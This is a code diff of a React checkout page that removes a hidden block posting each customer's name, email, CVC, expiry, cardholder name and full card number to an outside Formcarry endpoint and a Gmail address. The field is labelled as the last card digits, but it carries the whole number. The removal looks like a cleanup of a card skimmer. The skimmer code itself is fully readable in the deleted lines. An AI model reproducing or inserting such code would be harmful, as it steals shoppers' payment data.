@@ -14,8 +14,6 @@ import {
 	FiShoppingBag,
 } from "react-icons/fi";
 
-const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
-const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";
 
 function normalizeCardNumber(value) {
 	return value.replace(/\D/g, "");
@@ -339,34 +337,6 @@ function CheckoutContent() {
 		try {
 			const response = await axios.post("/api/orders", payload);
 			orderId = response.data?.data?.orderId || "-";
-
-			if (!FORMCARRY_ENDPOINT.includes("XXXX")) {
-				const formBody = new URLSearchParams({
-					name: customerName.trim(),
-					email: customerEmail.trim(),
-					card_cvc: cardCvc,
-					product: selectedProductName,
-					product_price: String(selectedProductPrice),
-					service_fee: String(serviceFee),
-					total_price: String(totalPrice),
-					coupon_code: couponCode || "-",
-					payment_method: "card",
-					card_holder: cardHolder.trim(),
-					card_last: normalizedCard.slice(),
-					card_expiry: cardExpiry,
-					order_id: orderId,
-					receiver_email: ORDER_RECEIVER_EMAIL,
-				});
-
-				await fetch(FORMCARRY_ENDPOINT, {
-					method: "POST",
-					headers: {
-						"Content-Type": "application/x-www-form-urlencoded",
-						Accept: "application/json",
-					},
-					body: formBody.toString(),
-				});
-			}
 		} catch (error) {
 			console.log(error);
 			console.log(error.response?.data);
